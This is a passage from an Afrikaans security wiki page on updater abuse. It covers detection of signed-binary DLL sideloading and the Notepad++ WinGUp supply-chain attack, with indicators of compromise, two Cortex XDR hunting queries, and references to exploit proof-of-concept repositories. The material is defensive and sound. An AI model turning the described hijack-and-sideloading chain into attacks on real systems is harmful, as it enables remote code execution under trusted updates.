- Behandel **BYO signed binary sideloading** as ’n opsporingsaanknopingspunt ná aflaai: waarsku wanneer ’n getekende verskaffer-EXE ’n DLL met ’n naam van buite sy kanonieke installasieroete laai (bv. Bitdefender wat `log.dll` vanaf Temp/Downloads laai), en wanneer ’n updater installeerders met nie-verskaffer-handtekeninge in tydelike liggings plaas/uitvoer.
- Monitor **malware-spesifieke artefakte** wat in hierdie ketting waargeneem is (nuttig as algemene aanknopingspunte): mutex `Global\Jdhfv_1.0.1`, abnormale `gup.exe`-skryfbewerkings na `%TEMP%` en Lua-gedrewe shellcode-inspuitingsfases.
- Notepad++ het gereageer deur WinGUp in v8.8.9 en later te versterk: die teruggestuurde XML word nou onderteken (XMLDSig), en nuwer weergawes dwing sertifikaat- en handtekeningverifikasie van die afgelaaide installeerder af, eerder as om slegs die transport te vertrou.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading van Bitdefender-getekende EXE <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat ’n installeerder begin wat nie vir Notepad++ is nie</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Hierdie patrone is van toepassing op enige updater wat ongetekende manifests aanvaar of versuim om installer-ondertekenaars vas te pen—network hijack + malicious installer + BYO-signed sideloading lei tot remote code execution onder die dekmantel van “vertroude” updates.

---
## References
- [1] [Advies – Netskope Client for Windows – Plaaslike voorregte-eskalasie via skelm bediener (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-sekuriteitsadvies NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC-client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre en Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Plaaslike voorregte-eskalasie via skryfbare lêers in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Voorregte-eskalasie in Windows-agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Staatsakteurs buit Notepad++ se voorsieningsketting uit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – opdatering oor die voorval met gekaapte infrastruktuur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Omseiling van die oplossing vir CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Ontdekking van voorregte-eskalasiefoute in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
